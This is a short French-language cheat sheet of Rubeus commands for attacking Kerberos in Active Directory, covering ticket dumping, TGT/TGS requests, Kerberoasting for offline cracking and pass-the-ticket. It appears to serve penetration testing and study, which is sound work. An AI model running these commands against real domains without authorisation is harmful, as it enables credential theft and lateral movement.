https://github.com/GhostPack/Rubeus

#### 🎟️ Dump des tickets Kerberos

```bash
Rubeus.exe dump
```

Affiche tous les **tickets Kerberos** stockés en mémoire.

#### 🆕 Demander un Ticket Granting Ticket (TGT)

```bash
Rubeus.exe asktgt /user: /password: /domain:
```

Génère un **TGT** en fournissant les **identifiants utilisateur**.

#### 🎟️ Demander un Ticket Granting Service (TGS)

```bash
Rubeus.exe asktgs /ticket: /service:
```

Permet d’obtenir un **TGS** pour accéder à un service spécifique.

> [!Astuce]
> 🔹 **Paramètres** :
> 
> - `/ticket:` → **TGT en Base64**
> - `/service:` → **Nom du service cible** (ex: `cifs/machine.domain.local`)

#### 🔥 Kerberoasting (Dump des TGS exploitables)

```bash
Rubeus.exe kerberoast
```

Extrait les **TGS** des services AD pour effectuer une **attaque de bruteforce offline**.

#### 🎭 Pass-The-Ticket (PTT)

```bash
Rubeus.exe ptt /ticket:
```

Charge un **ticket Kerberos (TGT ou TGS)** en mémoire pour l’utiliser sans authentification.

> [!Astuce]
> 🔹 **Paramètre** :
> 
> - `/ticket:` → **TGT en Base64**

#### ♻️ Renouveler un TGT

```bash
Rubeus.exe renew /ticket:
```

Permet de **renouveler** un **TGT** avant qu’il n’expire.

> [!Astuce]
> 🔹 **Paramètre** :
> 
> - `/ticket:` → **TGT en Base64**

#### 🔍 Surveiller les changements de tickets Kerberos

```bash
Rubeus.exe monitor
```

Affiche en temps réel les **modifications des tickets Kerberos** sur la machine actuelle.
